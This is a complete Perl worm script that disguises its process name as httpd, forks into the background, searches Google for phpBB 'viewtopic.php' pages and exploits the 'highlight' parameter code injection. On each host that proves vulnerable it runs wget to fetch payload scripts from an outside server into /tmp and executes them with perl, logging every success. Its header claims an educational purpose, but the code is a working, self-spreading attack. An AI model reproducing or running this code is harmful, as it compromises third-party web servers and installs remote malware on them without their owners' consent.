#############################################################
#   Developed by br0k3d 				    #
#   For educational purpose only 			    #
#   Based ( almost ripped ) at ASW Worm!		    #
#   Just made it to study perl ;)		            #
#   10nd Version - fuckz afropress.com                      #
#   => ojusticeiro@gmail.com <=			            #
#############################################################

use strict;
use IO::Socket;
use IO::Handle;


my $process = '/usr/sbin/httpd'; 
$0="$process"."\0"x16;;
my $pid=fork;


sub fetch();
sub remote($);
sub http_query($);
sub encode($);

sub fetch(){
    my $rnd=(int(rand(9999)));
    my $n= 50;
    if ($rnd<5000) { $n<<=1;}
    my $s= (int(rand(10)) * $n);

    my @str=("viewtopic+%22.php%3Fp%3D%22+",
             "viewtopic+%22.php%3Ft%3D%22+"
);

    my $query="www.google.com.br/search?q=";
    $query.=$str[(rand(scalar(@str)))].$rnd;
    $query.="&num=$n&start=$s";

    my @lst=();
    my $page = http_query($query);
    while ($page =~  m/<a href=\"?http:\/\/([^>\"]+)\"?>/g){
        if ($1 !~ m/google|cache|translate/){
            push (@lst,$1);
        }
    }
    return (@lst);
}

sub http_query($){
    my ($url) = @_;
    my $host=$url;
    my $query=$url;
    my $page="";
    $host =~ s/href=\"?http:\/\///;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~s/$host//;
    if ($query eq "") {$query="/";};
    eval {
        local $SIG{ALRM} = sub { die "1";};
        alarm 10;
        my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
        print $sock "GET $query HTTP/1.0\nHost: $host\nAccept: */*\nUser-Agent: Mozilla/4.0\n\n ";
        my @r = <$sock>;
        $page="@r";
        alarm 0;
        close($sock);
    };    
    return $page;

}

sub encode($) {
    my $s = shift;
    $s =~ s/(.)/"chr(".ord($1).")%252E"/seg;
    $s =~ s/%252E$//;
    return $s;
}



eval {fork and exit;};

$|++;
open LOG,">> .aids"; # APENAS PARA DEBUGGING , EHEHEHEHEHE #
autoflush LOG 1;
srand;
my $iam=$ARGV[0];
my $oneday=time+86400; # Antigamente era 1 semana mais o google ficou pau no cu ...
my $page="";
my @urls;
my $url;






while(time<$oneday){
    @urls=fetch();
    foreach $url (@urls) {
	if ($url !~ /viewtopic.php/) {next;}
	$url =~ s/(.*\/viewtopic.php\?[t|p]=[0-9]+).*/$1/;
	print LOG "chk ".$url." ";
	my $cmd=encode("perl -e \"print q(jSVowMsd)\"");
	$url .="&highlight=%2527%252Esystem(".$cmd.")%252E%2527";
	$page = http_query($url);
	if ( $page =~ /jSVowMsd/ ){
	    $url =~ s/&highlight.*//;
	    my $upload=$url;
	    $upload =~ s/viewtopic.*//;
	    print LOG ">bug viewtopic encontrado ";
	    $cmd="wget http://www.yogiplanet.com/chobits/linuxday.txt -O /tmp/.php1488;perl /tmp/.1488";    # set cmd
	    $cmd=encode("$cmd");    # set cmd
	    $url .="&highlight=%2527%252Esystem(".$cmd.")%252E%2527";
	    $page = http_query($url);
	    
	    $cmd="wget http://www.yogiplanet.com/chobits/linuxdaybot.txt -O /tmp/.php1489; perl /tmp/.php1489; touch /tmp/.minhavinganca";    # set cmd
	    $cmd=encode("$cmd");    # set cmd
	    $url =~ s/&highlight.*//;
	    $url .="&highlight=%2527%252Esystem(".$cmd.")%252E%2527";
	    $page = http_query($url);
	    print LOG ">exploitado!\n";
	}
	else {
	    print LOG ">viewtopic ok\n";
	}
    }
}
close LOG;


